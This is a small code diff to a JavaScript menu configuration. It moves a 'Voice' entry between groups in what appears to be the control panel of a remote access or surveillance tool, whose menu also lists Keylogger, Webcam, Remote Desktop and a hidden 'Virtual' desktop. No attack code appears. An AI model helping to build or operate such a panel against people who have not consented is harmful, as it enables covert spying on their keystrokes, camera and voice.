@@ -12,7 +12,6 @@ const MENU_GROUPS = [
       { label: "Remote Desktop", icon: "fa-solid fa-desktop",         icolor: "text-purple-400",  open: "remotedesktop" },
       { label: "Backstage",      icon: "fa-solid fa-ghost",           icolor: "text-violet-400",  open: "Backstage" },
       { label: "Virtual",         icon: "fa-solid fa-eye-slash",      icolor: "text-fuchsia-400", open: "Virtual", windowsOnly: true },
-      { label: "Voice",          icon: "fa-solid fa-headset",         icolor: "text-teal-400",    open: "voice" },
     ],
   },
   {
@@ -24,6 +23,7 @@ const MENU_GROUPS = [
       { label: "Webcam",          icon: "fa-solid fa-video",      icolor: "text-emerald-400", open: "webcam" },
       { label: "Keylogger",       icon: "fa-solid fa-keyboard",   icolor: "text-yellow-400",  open: "keylogger" },
       { label: "Process Manager", icon: "fa-solid fa-list-check", icolor: "text-orange-400",  open: "processes" },
+      { label: "Voice",          icon: "fa-solid fa-headset",         icolor: "text-teal-400",    open: "voice" },
     ],
   },
   {
